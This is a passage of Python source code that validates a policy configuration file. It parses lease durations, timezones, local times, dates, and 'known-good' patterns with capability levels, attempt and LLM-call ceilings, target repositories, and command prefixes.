            f"`{where}.minutes` is {minutes}, and a declared lease must be longer than the "
            f"default {int(DEFAULT_LEASE.total_seconds() // 60)} minutes and no longer than the "
            f"ceiling {int(LEASE_CEILING.total_seconds() // 60)} minutes; a row that would "
            "shorten a hold, or restate the default, is not a decision this document can express"
        )
    return Lease(
        rationale=_text(where, "rationale", value["rationale"]),
        decided=_decided(where, value["decided"]),
        duration=duration,
    )


def _zone(where: str, value: object) -> ZoneInfo:
    """The declared IANA zone, resolved once at load so an unknown name fails loudly and early."""
    if not isinstance(value, str) or not value.strip():
        raise _invalid(f'`{where}.timezone` must be an IANA zone name, e.g. "America/New_York"')
    try:
        return ZoneInfo(value)
    except (KeyError, ValueError, OSError) as error:
        raise _invalid(f"`{where}.timezone` is not a known IANA zone: {value!r}") from error


def _local_time(where: str, field: str, value: object) -> time:
    """A wall-clock ``HH:MM``, and nothing else.

    Length is checked before parsing because ``time.fromisoformat`` accepts more than a window can
    honestly mean: seconds nobody would review, and a trailing offset, which would put a second
    zone in a row that already declares one.
    """
    if not isinstance(value, str) or len(value) != 5:
        raise _invalid(f'`{where}.{field}` must be a local time written as HH:MM, e.g. "02:00"')
    try:
        return time.fromisoformat(value)
    except ValueError as error:
        raise _invalid(f"`{where}.{field}` is not a time: {value!r}") from error


def _patterns(member: str, value: object) -> tuple[KnownGoodPattern, ...]:
    if not isinstance(value, list):
        raise _invalid(f"`[[reach.{member}.known_good]]` must be an array of tables")
    patterns = tuple(_pattern(member, entry) for entry in value)
    names = [pattern.name for pattern in patterns]
    if len(set(names)) != len(names):
        raise _invalid(f"`[reach.{member}]` declares two known-good patterns with the same name")
    return patterns


def _pattern(member: str, value: object) -> KnownGoodPattern:
    where = f"reach.{member}.known_good"
    if not isinstance(value, dict) or set(value) != _PATTERN_FIELDS:
        raise _invalid(
            f"`[[{where}]]` must be a table declaring exactly " + ", ".join(sorted(_PATTERN_FIELDS))
        )
    name = _text(where, "name", value["name"])
    return KnownGoodPattern(
        name=name,
        rationale=_text(f"{where}.{name}", "rationale", value["rationale"]),
        decided=_decided(f"{where}.{name}", value["decided"]),
        change_class=_text(f"{where}.{name}", "change_class", value["change_class"]),
        capabilities=_capabilities(f"{where}.{name}", value["capabilities"]),
        max_attempts=_ceiling(f"{where}.{name}", "max_attempts", value["max_attempts"]),
        max_llm_calls=_ceiling(f"{where}.{name}", "max_llm_calls", value["max_llm_calls"]),
        conformance_status=_text(
            f"{where}.{name}", "conformance_status", value["conformance_status"]
        ),
        target_repositories=frozenset(
            _string_list(f"{where}.{name}", "target_repositories", value["target_repositories"])
        ),
        command_prefixes=_command_prefixes(f"{where}.{name}", value["command_prefixes"]),
    )


def _text(where: str, field: str, value: object) -> str:
    if not isinstance(value, str) or not value.strip():
        raise _invalid(f"`{where}.{field}` must be a non-empty string")
    return " ".join(value.split())


def _ceiling(where: str, field: str, value: object) -> int:
    # A ceiling below zero, or a boolean masquerading as one, is a shape error rather than a
    # narrow pattern: `max_attempts = true` would otherwise read as a ceiling of one.
    if not isinstance(value, int) or isinstance(value, bool) or value < 0:
        raise _invalid(f"`{where}.{field}` must be a non-negative integer")
    return value


def _capabilities(where: str, value: object) -> Mapping[str, str]:
    if not isinstance(value, dict) or not value:
        raise _invalid(f"`{where}.capabilities` must be a non-empty table of capability to level")
    for capability, level in value.items():
        if not isinstance(level, str) or not level.strip():
            raise _invalid(f"`{where}.capabilities.{capability}` must be a non-empty string")
    return dict(value)


def _string_list(where: str, field: str, value: object) -> tuple[str, ...]:
    if not isinstance(value, list) or not value:
        raise _invalid(f"`{where}.{field}` must be a non-empty array of strings")
    for entry in value:
        if not isinstance(entry, str) or not entry.strip():
            raise _invalid(f"`{where}.{field}` entries must be non-empty strings")
    return tuple(value)


def _command_prefixes(where: str, value: object) -> tuple[tuple[str, ...], ...]:
    """Each declared prefix, lexed once at load time into the tokens a command must begin with.

    Written as a command line because that is how the person deciding it thinks about it, and
    compared as tokens because that is the only comparison that means anything: ``uv add`` as a
    string prefix also matches ``uv address-book``.
    """
    prefixes: list[tuple[str, ...]] = []
    for entry in _string_list(where, "command_prefixes", value):
        try:
            tokens = tuple(shlex.split(entry))
        except ValueError as error:
            raise _invalid(
                f"`{where}.command_prefixes` entry is not a command: {entry!r}"
            ) from error
        if not tokens:
            raise _invalid(f"`{where}.command_prefixes` entry is empty: {entry!r}")
        prefixes.append(tokens)
    return tuple(prefixes)


def _decided(where: str, value: object) -> date:
    # A quoted ISO date, following routing-policy.toml. A bare TOML date is a different shape and
    # is rejected rather than accepted alongside -- one shape, so there is nothing to coerce.
    if not isinstance(value, str):
        raise _invalid(f'`{where}.decided` must be a quoted ISO date, e.g. "2026-08-01"')
    try:
        return date.fromisoformat(value)
    except ValueError as error:
        raise _invalid(f"`{where}.decided` is not an ISO date: {value!r}") from error
